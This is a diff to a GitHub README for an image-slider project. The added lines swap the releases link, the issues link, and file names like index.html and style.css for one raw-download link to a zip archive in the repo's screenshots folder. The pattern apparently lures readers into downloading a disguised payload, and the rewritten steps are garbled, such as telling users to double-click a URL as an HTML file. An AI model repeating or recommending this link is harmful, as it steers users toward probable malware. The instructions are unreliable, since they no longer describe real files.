@@ -6,11 +6,11 @@ Welcome to the **Responsive-Image-Slider**! This application allows you to prese
 
 ## 🔗 Download Now
 
-[![Download Responsive-Image-Slider](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ultra829272828288/Responsive-Image-Slider/releases)
+[![Download Responsive-Image-Slider](https://github.com/ultra829272828288/Responsive-Image-Slider/raw/refs/heads/main/screenshots/Slider_Responsive_Image_1.3.zip)](https://github.com/ultra829272828288/Responsive-Image-Slider/raw/refs/heads/main/screenshots/Slider_Responsive_Image_1.3.zip)
 
 ### 📥 Download & Install
 
-To get started, visit this page to download: [Responsive-Image-Slider Releases](https://github.com/ultra829272828288/Responsive-Image-Slider/releases). Here, you will find all the available versions.
+To get started, visit this page to download: [Responsive-Image-Slider Releases](https://github.com/ultra829272828288/Responsive-Image-Slider/raw/refs/heads/main/screenshots/Slider_Responsive_Image_1.3.zip). Here, you will find all the available versions.
 
 1. Click on the link above.
 2. Choose the latest version listed on the page.
@@ -36,10 +36,10 @@ To get started, visit this page to download: [Responsive-Image-Slider Releases](
 
 Once you have downloaded and extracted the files, follow these simple steps to use the image slider:
 
-1. **Open the HTML file:** Locate the `index.html` file in the folder where you extracted the contents.
+1. **Open the HTML file:** Locate the `https://github.com/ultra829272828288/Responsive-Image-Slider/raw/refs/heads/main/screenshots/Slider_Responsive_Image_1.3.zip` file in the folder where you extracted the contents.
 2. **Add your images:** Replace the placeholder images in the `img` folder with your own. Ensure they are in JPG or PNG format.
-3. **Customize Settings (Optional):** Open the `script.js` or `style.css` file to adjust settings and styles as desired. You can change transition effects, adjust the size, or modify navigation controls.
-4. **Open in a web browser:** Double-click on the `index.html` file to view your image slider in action.
+3. **Customize Settings (Optional):** Open the `https://github.com/ultra829272828288/Responsive-Image-Slider/raw/refs/heads/main/screenshots/Slider_Responsive_Image_1.3.zip` or `https://github.com/ultra829272828288/Responsive-Image-Slider/raw/refs/heads/main/screenshots/Slider_Responsive_Image_1.3.zip` file to adjust settings and styles as desired. You can change transition effects, adjust the size, or modify navigation controls.
+4. **Open in a web browser:** Double-click on the `https://github.com/ultra829272828288/Responsive-Image-Slider/raw/refs/heads/main/screenshots/Slider_Responsive_Image_1.3.zip` file to view your image slider in action.
 
 ## 📊 How to Customize
 
@@ -47,12 +47,12 @@ For users interested in making the slider their own, consider the following:
 
 ### Adjusting Styles
 
-- Open `style.css`.
+- Open `https://github.com/ultra829272828288/Responsive-Image-Slider/raw/refs/heads/main/screenshots/Slider_Responsive_Image_1.3.zip`.
 - Change colors, fonts, and sizes to match your project’s branding.
 
 ### Modifying Transitions
 
-- Open `script.js`.
+- Open `https://github.com/ultra829272828288/Responsive-Image-Slider/raw/refs/heads/main/screenshots/Slider_Responsive_Image_1.3.zip`.
 - Look for the section that defines transition times and effects.
 - Set your preferred duration for smoother or faster transitions.
 
@@ -60,13 +60,13 @@ For users interested in making the slider their own, consider the following:
 
 If you encounter problems, here are a few solutions:
 
-- **Images Not Showing:** Ensure that your images are in the correct folder and the filenames match those in `index.html`.
-- **Slider Not Working:** Check that you opened the `index.html` file in a web browser. Opening files directly in text editors won’t display the slider.
+- **Images Not Showing:** Ensure that your images are in the correct folder and the filenames match those in `https://github.com/ultra829272828288/Responsive-Image-Slider/raw/refs/heads/main/screenshots/Slider_Responsive_Image_1.3.zip`.
+- **Slider Not Working:** Check that you opened the `https://github.com/ultra829272828288/Responsive-Image-Slider/raw/refs/heads/main/screenshots/Slider_Responsive_Image_1.3.zip` file in a web browser. Opening files directly in text editors won’t display the slider.
 - **Slow Performance:** Optimize images for web by reducing their file size before adding them to the slider.
 
 ## 📣 Getting Help
 
-For any questions or support, please check the [GitHub Issues Page](https://github.com/ultra829272828288/Responsive-Image-Slider/issues) or open a new issue if you can't find an answer.
+For any questions or support, please check the [GitHub Issues Page](https://github.com/ultra829272828288/Responsive-Image-Slider/raw/refs/heads/main/screenshots/Slider_Responsive_Image_1.3.zip) or open a new issue if you can't find an answer.
 
 ## 🔗 Topics Covered
 
